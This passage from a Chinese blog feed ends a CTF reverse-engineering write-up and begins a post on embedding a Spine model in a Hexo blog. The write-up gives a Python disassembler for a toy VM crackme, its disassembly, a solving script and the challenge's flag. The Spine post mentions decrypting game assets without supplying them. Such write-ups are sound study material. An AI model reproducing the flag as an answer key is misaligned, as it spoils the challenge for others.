&#123;0:0&gt;4&#125;&quot;</span>],</span><br><span class="line">    <span class="number">0x09</span>:[<span class="number">3</span>,<span class="number">2</span>,<span class="string">&quot;xor [r&#123;0&#125;],0x&#123;1:0&gt;2X&#125;&quot;</span>],</span><br><span class="line">    <span class="number">0x19</span>:[<span class="number">3</span>,<span class="number">2</span>,<span class="string">&quot;xor [r&#123;0&#125;],r&#123;1&#125;&quot;</span>],</span><br><span class="line">    <span class="number">0x0A</span>:[<span class="number">3</span>,<span class="number">2</span>,<span class="string">&quot;add [r&#123;0&#125;],0x&#123;1:0&gt;2X&#125;&quot;</span>],</span><br><span class="line">    <span class="number">0x0B</span>:[<span class="number">3</span>,<span class="number">2</span>,<span class="string">&quot;sub r&#123;0&#125;,0x&#123;1:0&gt;2X&#125;&quot;</span>],</span><br><span class="line">&#125;</span><br><span class="line">opcode=\</span><br><span class="line">[<span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x21</span>, <span class="number">0x01</span>, <span class="number">0x0A</span>, <span class="number">0x02</span>, <span class="number">0x01</span>, <span class="number">0x21</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x01</span>, <span class="number">0x21</span>, <span class="number">0x01</span>, <span class="number">0x0F</span>, <span class="number">0x02</span>, <span class="number">0x01</span>, <span class="number">0x21</span>, <span class="number">0x01</span>, <span class="number">0x08</span>, <span class="number">0x02</span>, <span class="number">0x01</span>, <span class="number">0x21</span>, <span class="number">0x01</span>, <span class="number">0x13</span>, <span class="number">0x02</span>, <span class="number">0x01</span>, <span class="number">0x21</span>, <span class="number">0x01</span>, <span class="number">0x7D</span>, <span class="number">0x02</span>, <span class="number">0x01</span>, <span class="number">0x21</span>, <span class="number">0x01</span>, <span class="number">0x5A</span>, <span class="number">0x02</span>, <span class="number">0x01</span>, <span class="number">0x21</span>, <span class="number">0x01</span>, <span class="number">0x1D</span>, <span class="number">0x02</span>, <span class="number">0x01</span>, <span class="number">0x21</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x01</span>, <span class="number">0x21</span>, <span class="number">0x01</span>, <span class="number">0x17</span>, <span class="number">0x02</span>, <span class="number">0x01</span>, <span class="number">0x21</span>, <span class="number">0x01</span>, <span class="number">0x79</span>, <span class="number">0x02</span>, <span class="number">0x01</span>, <span class="number">0x21</span>, <span class="number">0x01</span>, <span class="number">0x56</span>, <span class="number">0x02</span>, <span class="number">0x01</span>, <span class="number">0x21</span>, <span class="number">0x01</span>, <span class="number">0x13</span>, <span class="number">0x02</span>, <span class="number">0x01</span>, <span class="number">0x21</span>, <span class="number">0x01</span>, <span class="number">0x7E</span>, <span class="number">0x02</span>, <span class="number">0x01</span>, <span class="number">0x21</span>, <span class="number">0x01</span>, <span class="number">0x0F</span>, <span class="number">0x02</span>, <span class="number">0x01</span>, <span class="number">0x21</span>, <span class="number">0x01</span>, <span class="number">0x1A</span>, <span class="number">0x02</span>, <span class="number">0x01</span>, <span class="number">0x21</span>, <span class="number">0x01</span>, <span class="number">0x63</span>, <span class="number">0x02</span>, <span class="number">0x01</span>, <span class="number">0x21</span>, <span class="number">0x01</span>, <span class="number">0x1F</span>, <span class="number">0x02</span>, <span class="number">0x01</span>, <span class="number">0x21</span>, <span class="number">0x01</span>, <span class="number">0x11</span>, <span class="number">0x02</span>, <span class="number">0x01</span>, <span class="number">0x21</span>, <span class="number">0x01</span>, <span class="number">0x06</span>, <span class="number">0x02</span>, <span class="number">0x01</span>, <span class="number">0x21</span>, <span class="number">0x01</span>, <span class="number">0x1E</span>, <span class="number">0x02</span>, <span class="number">0x01</span>, <span class="number">0x21</span>, <span class="number">0x01</span>, <span class="number">0x0B</span>, <span class="number">0x02</span>, <span class="number">0x01</span>, <span class="number">0x21</span>, <span class="number">0x01</span>, <span class="number">0x13</span>, <span class="number">0x02</span>, <span class="number">0x01</span>, <span class="number">0x21</span>, <span class="number">0x01</span>, <span class="number">0x48</span>, <span class="number">0x02</span>, <span class="number">0x01</span>, <span class="number">0x21</span>, <span class="number">0x01</span>, <span class="number">0x1A</span>, <span class="number">0x02</span>, <span class="number">0x01</span>, <span class="number">0x21</span>, <span class="number">0x01</span>, <span class="number">0x11</span>, <span class="number">0x02</span>, <span class="number">0x01</span>, <span class="number">0x21</span>, <span class="number">0x01</span>, <span class="number">0x69</span>, <span class="number">0x02</span>, <span class="number">0x01</span>, <span class="number">0x21</span>, <span class="number">0x01</span>, <span class="number">0x1F</span>, <span class="number">0x02</span>, <span class="number">0x01</span>, <span class="number">0x21</span>, <span class="number">0x01</span>, <span class="number">0x44</span>, <span class="number">0x02</span>, <span class="number">0x01</span>, <span class="number">0x21</span>, <span class="number">0x01</span>, <span class="number">0x19</span>, <span class="number">0x02</span>, <span class="number">0x01</span>, <span class="number">0x21</span>, <span class="number">0x01</span>, <span class="number">0x13</span>, <span class="number">0x02</span>, <span class="number">0x01</span>, <span class="number">0x21</span>, <span class="number">0x01</span>, <span class="number">0x0E</span>, <span class="number">0x02</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x57</span>, <span class="number">0x06</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x68</span>, <span class="number">0x06</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x61</span>, <span class="number">0x06</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x74</span>, <span class="number">0x06</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x20</span>, <span class="number">0x06</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x69</span>, <span class="number">0x06</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x73</span>, <span class="number">0x06</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x20</span>, <span class="number">0x06</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x79</span>, <span class="number">0x06</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x6F</span>, <span class="number">0x06</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x75</span>, <span class="number">0x06</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x72</span>, <span class="number">0x06</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x20</span>, <span class="number">0x06</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x66</span>, <span class="number">0x06</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x6C</span>, <span class="number">0x06</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x61</span>, <span class="number">0x06</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x67</span>, <span class="number">0x06</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x3F</span>, <span class="number">0x06</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x0A</span>, <span class="number">0x06</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x05</span>, <span class="number">0x02</span>, <span class="number">0x03</span>, <span class="number">0x02</span>, <span class="number">0x02</span>, <span class="number">0x01</span>, <span class="number">0x07</span>, <span class="number">0x01</span>, <span class="number">0x20</span>, <span class="number">0x08</span>, <span class="number">0xF5</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x0A</span>, <span class="number">0x01</span>, <span class="number">0x40</span>, <span class="number">0x02</span>, <span class="number">0x01</span>, <span class="number">0x07</span>, <span class="number">0x01</span>, <span class="number">0x20</span>, <span class="number">0x08</span>, <span class="number">0xF6</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x40</span>, <span class="number">0x04</span>, <span class="number">0x02</span>, <span class="number">0x0B</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x31</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x07</span>, <span class="number">0x01</span>, <span class="number">0x20</span>, <span class="number">0x08</span>, <span class="number">0xF3</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x20</span>, <span class="number">0x11</span>, <span class="number">0x02</span>, <span class="number">0x01</span>, <span class="number">0x0B</span>, <span class="number">0x02</span>, <span class="number">0x20</span>, <span class="number">0x19</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x02</span>, <span class="number">0x01</span>, <span class="number">0x07</span>, <span class="number">0x01</span>, <span class="number">0x40</span>, <span class="number">0x08</span>, <span class="number">0xF0</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x20</span>, <span class="number">0x0A</span>, <span class="number">0x01</span>, <span class="number">0x20</span>, <span class="number">0x02</span>, <span class="number">0x01</span>, <span class="number">0x07</span>, <span class="number">0x01</span>, <span class="number">0x40</span>, <span class="number">0x08</span>, <span class="number">0xF6</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x20</span>, <span class="number">0x09</span>, <span class="number">0x01</span>, <span class="number">0xCC</span>, <span class="number">0x17</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x08</span>, <span class="number">0x2E</span>, <span class="number">0x02</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x02</span>, <span class="number">0x07</span>, <span class="number">0x01</span>, <span class="number">0x20</span>, <span class="number">0x08</span>, <span class="number">0xEF</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x52</span>, <span class="number">0x06</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x69</span>, <span class="number">0x06</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x67</span>, <span class="number">0x06</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x68</span>, <span class="number">0x06</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x74</span>, <span class="number">0x06</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x21</span>, <span class="number">0x06</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x0A</span>, <span class="number">0x06</span>, <span class="number">0x01</span>, <span class="number">0x18</span>, <span class="number">0x23</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x57</span>, <span class="number">0x06</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x72</span>, <span class="number">0x06</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x6F</span>, <span class="number">0x06</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x6E</span>, <span class="number">0x06</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x67</span>, <span class="number">0x06</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x21</span>, <span class="number">0x06</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x0A</span>, <span class="number">0x06</span>, <span class="number">0x01</span>, <span class="number">0x00</span>]</span><br><span class="line">pc=<span class="number">0</span></span><br><span class="line">res=[<span class="string">&quot;Addr          Code\n&quot;</span>]</span><br><span class="line">addrfmt=<span class="string">&quot;&#123;0:0&gt;4&#125;    &quot;</span></span><br><span class="line"><span class="keyword">while</span> pc&lt;<span class="built_in">len</span>(opcode):</span><br><span class="line">    i=pc</span><br><span class="line">    pc+=ins_set[opcode[i]][<span class="number">0</span>]</span><br><span class="line">    res.append(addrfmt.<span class="built_in">format</span>(i))</span><br><span class="line">    <span class="keyword">if</span> opcode[i] <span class="keyword">not</span> <span class="keyword">in</span> ins_set.keys(): <span class="comment">#如果指令集中不存在该opcode</span></span><br><span class="line">        print(<span class="string">&quot;[-] UknOpcode 0x&#123;0:X&#125; in addr 0x&#123;1:0&gt;8X&#125;.\n&quot;</span>.<span class="built_in">format</span>(opcode[i],i))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">elif</span> opcode[i]==<span class="number">0x08</span> <span class="keyword">or</span> opcode[i]==<span class="number">0x18</span>:</span><br><span class="line">        jmpdelta=opcode[i+<span class="number">1</span>] <span class="keyword">if</span> opcode[i+<span class="number">1</span>]&amp;<span class="number">0x80</span>==<span class="number">0</span> <span class="keyword">else</span> opcode[i+<span class="number">1</span>]<span class="number">-256</span></span><br><span class="line">        res.append(ins_set[opcode[i]][<span class="number">2</span>].<span class="built_in">format</span>(pc+jmpdelta)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>: <span class="comment">#一般opcode的处理</span></span><br><span class="line">        args=[]</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(ins_set[opcode[i]][<span class="number">1</span>]):</span><br><span class="line">            args.append(opcode[i+<span class="number">1</span>+j])</span><br><span class="line">        res.append(ins_set[opcode[i]][<span class="number">2</span>].<span class="built_in">format</span>(*args)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> opcode[i]==<span class="number">0</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;res.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.writelines(res)</span><br></pre></td></tr></table></figure><p>得到的<code>res.txt</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br></pre></td><td class="code"><pre><span class="line">Addr          Code</span><br><span class="line">0000    mov r1,0x00</span><br><span class="line">0003    mov [r1],0x0A</span><br><span class="line">0006    inc r1</span><br><span class="line">0008    mov [r1],0x01</span><br><span class="line">0011    inc r1</span><br><span class="line">0013    mov [r1],0x0F</span><br><span class="line">0016    inc r1</span><br><span class="line">0018    mov [r1],0x08</span><br><span class="line">0021    inc r1</span><br><span class="line">0023    mov [r1],0x13</span><br><span class="line">0026    inc r1</span><br><span class="line">0028    mov [r1],0x7D</span><br><span class="line">0031    inc r1</span><br><span class="line">0033    mov [r1],0x5A</span><br><span class="line">0036    inc r1</span><br><span class="line">0038    mov [r1],0x1D</span><br><span class="line">0041    inc r1</span><br><span class="line">0043    mov [r1],0x01</span><br><span class="line">0046    inc r1</span><br><span class="line">0048    mov [r1],0x17</span><br><span class="line">0051    inc r1</span><br><span class="line">0053    mov [r1],0x79</span><br><span class="line">0056    inc r1</span><br><span class="line">0058    mov [r1],0x56</span><br><span class="line">0061    inc r1</span><br><span class="line">0063    mov [r1],0x13</span><br><span class="line">0066    inc r1</span><br><span class="line">0068    mov [r1],0x7E</span><br><span class="line">0071    inc r1</span><br><span class="line">0073    mov [r1],0x0F</span><br><span class="line">0076    inc r1</span><br><span class="line">0078    mov [r1],0x1A</span><br><span class="line">0081    inc r1</span><br><span class="line">0083    mov [r1],0x63</span><br><span class="line">0086    inc r1</span><br><span class="line">0088    mov [r1],0x1F</span><br><span class="line">0091    inc r1</span><br><span class="line">0093    mov [r1],0x11</span><br><span class="line">0096    inc r1</span><br><span class="line">0098    mov [r1],0x06</span><br><span class="line">0101    inc r1</span><br><span class="line">0103    mov [r1],0x1E</span><br><span class="line">0106    inc r1</span><br><span class="line">0108    mov [r1],0x0B</span><br><span class="line">0111    inc r1</span><br><span class="line">0113    mov [r1],0x13</span><br><span class="line">0116    inc r1</span><br><span class="line">0118    mov [r1],0x48</span><br><span class="line">0121    inc r1</span><br><span class="line">0123    mov [r1],0x1A</span><br><span class="line">0126    inc r1</span><br><span class="line">0128    mov [r1],0x11</span><br><span class="line">0131    inc r1</span><br><span class="line">0133    mov [r1],0x69</span><br><span class="line">0136    inc r1</span><br><span class="line">0138    mov [r1],0x1F</span><br><span class="line">0141    inc r1</span><br><span class="line">0143    mov [r1],0x44</span><br><span class="line">0146    inc r1</span><br><span class="line">0148    mov [r1],0x19</span><br><span class="line">0151    inc r1</span><br><span class="line">0153    mov [r1],0x13</span><br><span class="line">0156    inc r1</span><br><span class="line">0158    mov [r1],0x0E</span><br><span class="line">0161    inc r1</span><br><span class="line">0163    mov r1,0x57</span><br><span class="line">0166    putchar(r1)</span><br><span class="line">0168    mov r1,0x68</span><br><span class="line">0171    putchar(r1)</span><br><span class="line">0173    mov r1,0x61</span><br><span class="line">0176    putchar(r1)</span><br><span class="line">0178    mov r1,0x74</span><br><span class="line">0181    putchar(r1)</span><br><span class="line">0183    mov r1,0x20</span><br><span class="line">0186    putchar(r1)</span><br><span class="line">0188    mov r1,0x69</span><br><span class="line">0191    putchar(r1)</span><br><span class="line">0193    mov r1,0x73</span><br><span class="line">0196    putchar(r1)</span><br><span class="line">0198    mov r1,0x20</span><br><span class="line">0201    putchar(r1)</span><br><span class="line">0203    mov r1,0x79</span><br><span class="line">0206    putchar(r1)</span><br><span class="line">0208    mov r1,0x6F</span><br><span class="line">0211    putchar(r1)</span><br><span class="line">0213    mov r1,0x75</span><br><span class="line">0216    putchar(r1)</span><br><span class="line">0218    mov r1,0x72</span><br><span class="line">0221    putchar(r1)</span><br><span class="line">0223    mov r1,0x20</span><br><span class="line">0226    putchar(r1)</span><br><span class="line">0228    mov r1,0x66</span><br><span class="line">0231    putchar(r1)</span><br><span class="line">0233    mov r1,0x6C</span><br><span class="line">0236    putchar(r1)</span><br><span class="line">0238    mov r1,0x61</span><br><span class="line">0241    putchar(r1)</span><br><span class="line">0243    mov r1,0x67</span><br><span class="line">0246    putchar(r1)</span><br><span class="line">0248    mov r1,0x3F</span><br><span class="line">0251    putchar(r1)</span><br><span class="line">0253    mov r1,0x0A</span><br><span class="line">0256    putchar(r1)</span><br><span class="line">0258    mov r1,0x00</span><br><span class="line">0261    r2 &#x3D; getchar()</span><br><span class="line">0263    push r2</span><br><span class="line">0265    inc r1</span><br><span class="line">0267    cmp r1,0x20</span><br><span class="line">0270    jnz 0261</span><br><span class="line">0272    mov r1,0x00</span><br><span class="line">0275    add [r1],0x40</span><br><span class="line">0278    inc r1</span><br><span class="line">0280    cmp r1,0x20</span><br><span class="line">0283    jnz 0275</span><br><span class="line">0285    mov r1,0x40</span><br><span class="line">0288    pop r2</span><br><span class="line">0290    sub r1,0x01</span><br><span class="line">0293    mov [r1],r2</span><br><span class="line">0296    cmp r1,0x20</span><br><span class="line">0299    jnz 0288</span><br><span class="line">0301    mov r1,0x20</span><br><span class="line">0304    mov r2,r1</span><br><span class="line">0307    sub r2,0x20</span><br><span class="line">0310    xor [r1],r2</span><br><span class="line">0313    inc r1</span><br><span class="line">0315    cmp r1,0x40</span><br><span class="line">0318    jnz 0304</span><br><span class="line">0320    mov r1,0x20</span><br><span class="line">0323    add [r1],0x20</span><br><span class="line">0326    inc r1</span><br><span class="line">0328    cmp r1,0x40</span><br><span class="line">0331    jnz 0323</span><br><span class="line">0333    mov r1,0x00</span><br><span class="line">0336    mov r2,0x20</span><br><span class="line">0339    xor [r1],0xCC</span><br><span class="line">0342    cmp [r1],[r2]</span><br><span class="line">0345    jnz 0393</span><br><span class="line">0347    inc r1</span><br><span class="line">0349    inc r2</span><br><span class="line">0351    cmp r1,0x20</span><br><span class="line">0354    jnz 0339</span><br><span class="line">0356    mov r1,0x52</span><br><span class="line">0359    putchar(r1)</span><br><span class="line">0361    mov r1,0x69</span><br><span class="line">0364    putchar(r1)</span><br><span class="line">0366    mov r1,0x67</span><br><span class="line">0369    putchar(r1)</span><br><span class="line">0371    mov r1,0x68</span><br><span class="line">0374    putchar(r1)</span><br><span class="line">0376    mov r1,0x74</span><br><span class="line">0379    putchar(r1)</span><br><span class="line">0381    mov r1,0x21</span><br><span class="line">0384    putchar(r1)</span><br><span class="line">0386    mov r1,0x0A</span><br><span class="line">0389    putchar(r1)</span><br><span class="line">0391    jmp 0428</span><br><span class="line">0393    mov r1,0x57</span><br><span class="line">0396    putchar(r1)</span><br><span class="line">0398    mov r1,0x72</span><br><span class="line">0401    putchar(r1)</span><br><span class="line">0403    mov r1,0x6F</span><br><span class="line">0406    putchar(r1)</span><br><span class="line">0408    mov r1,0x6E</span><br><span class="line">0411    putchar(r1)</span><br><span class="line">0413    mov r1,0x67</span><br><span class="line">0416    putchar(r1)</span><br><span class="line">0418    mov r1,0x21</span><br><span class="line">0421    putchar(r1)</span><br><span class="line">0423    mov r1,0x0A</span><br><span class="line">0426    putchar(r1)</span><br><span class="line">0428    exit</span><br></pre></td></tr></table></figure><p>很标~准的汇编啦，稍微捋捋逻辑就出来了：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">dst = [<span class="number">10</span>, <span class="number">1</span>, <span class="number">15</span>, <span class="number">8</span>, <span class="number">19</span>, <span class="number">125</span>, <span class="number">90</span>, <span class="number">29</span>, <span class="number">1</span>, <span class="number">23</span>, <span class="number">121</span>, <span class="number">86</span>, <span class="number">19</span>, <span class="number">126</span>, <span class="number">15</span>, <span class="number">26</span>, <span class="number">99</span>, <span class="number">31</span>, <span class="number">17</span>, <span class="number">6</span>, <span class="number">30</span>, <span class="number">11</span>, <span class="number">19</span>, <span class="number">72</span>, <span class="number">26</span>, <span class="number">17</span>, <span class="number">105</span>, <span class="number">31</span>, <span class="number">68</span>, <span class="number">25</span>, <span class="number">19</span>, <span class="number">14</span>]</span><br><span class="line">flag = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    flag.append((((dst[i]+<span class="number">64</span>)^<span class="number">0xCC</span>)<span class="number">-32</span>)^i)</span><br><span class="line"></span><br><span class="line">print(<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">chr</span>,flag)))</span><br></pre></td></tr></table></figure><p>flag：<strong>flag{T0ver_1s_my_boyfri3nd_h4ha}</strong></p><p>搞定，下班（逃</p>]]></content>
      
      
      <categories>
          
          <category> Write up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Reverse </tag>
            
            <tag> Misc </tag>
            
            <tag> wp </tag>
            
            <tag> 华师CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>在你的博客里放一只可爱的Spine Model吧~</title>
      <link href="p/blogsFor-hexo-puttingLivelySpineModels/"/>
      <url>p/blogsFor-hexo-puttingLivelySpineModels/</url>
      
        <content type="html"><![CDATA[<p>一切的开始 <del>万恶之源</del> 是某Tover说想在他博客上养一只Miku，还想要小的，然后……本着自己的npy能宠一定宠的原则，就去把pjsk资源解包+解密了（具体请自己折腾，版权问题本文不提供现成资源）。</p><p>然而没想到解出来发现小Miku的模型是用spine做的，而<strong>能找到的绝大多数文章都是在hexo里添加live2d而不是spine</strong>，于是开始了漫漫魔改路。得益于之前的魔改把Melody主题的结构摸清楚了，才能知道哪些代码放哪里怎么用hhh（折腾只有一次和无数次？</p><a id="more"></a><p>效果展示：<a href="https://c10udlnk.top/">https://c10udlnk.top</a></p><p><img src="/p/blogsFor-hexo-puttingLivelySpineModels/image-20211101191625607.png"></p><blockquote><p>参考文章</p><ul><li>解密方法出处（脚本用python读文件写就很简单了hhh）：<a href="https://www.bilibili.com/read/cv7921411/">【世界计划 多彩舞台】关于Project SEKAI游戏资源的提取 - 哔哩哔哩</a></li><li>在hexo中添加spine模型：<a href="https://jin-yuhan.github.io/posts/4eb44f55/">在博客中添加明日方舟小人 - Stalo Fantasia♪</a></li></ul></blockquote><h1 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h1><p>一个spine模型应该有以下几个必备文件：</p><ul><li><code>xxx.skel</code>：骨架</li><li><code>xxx.png</code>：贴图</li><li><code>xxx.atlas</code>：纹理图集</li></ul><p>在<strong>主题文件的源目录</strong>中（例如Melody主题的路径是<code>blog/node_modules/hexo-theme-melody</code>，Butterfly的则是在<code>Blog/themes/butterfly</code>中）新增一个名为<code>spine_models</code>的文件夹，并将以上文件放于同一子目录中（下图示例是<code>sd_21miku_normal_r</code>文件夹）。</p><p>在<code>spine_models</code>文件夹下新建一个随机长度的空语音<code>default.mp3</code>（为了显示文本而无声音，<strong>将在后续改进中大修</strong>，避免此无用操作）。</p><p><img src="/p/blogsFor-hexo-puttingLivelySpineModels/image-20211102194122693.png"></p><h1 id="更改-config-yml"><a href="#更改-config-yml" class="headerlink" title="更改_config.yml"></a>更改_config.yml</h1><p>在<code>_config.yml</code>最后新增以下部分，具体什么配置改什么都写在注释里了。</p><p>其中<code>animations</code>（动画名称）和<code>skin</code>（皮肤）可以用spine对应版本的<a href="http://zh.esotericsoftware.com/spine-skeleton-viewer">Skeleton Viewer</a>来看，比如Miku的是3.6.53的spine，那用<code>skeletonViewer-3.6.53.jar</code>可以看到：</p><p><img src="/p/blogsFor-hexo-puttingLivelySpineModels/image-20211102192727985.png"></p><p>在<code>_config.yml</code>中增加的代码：</p><figure class="highlight 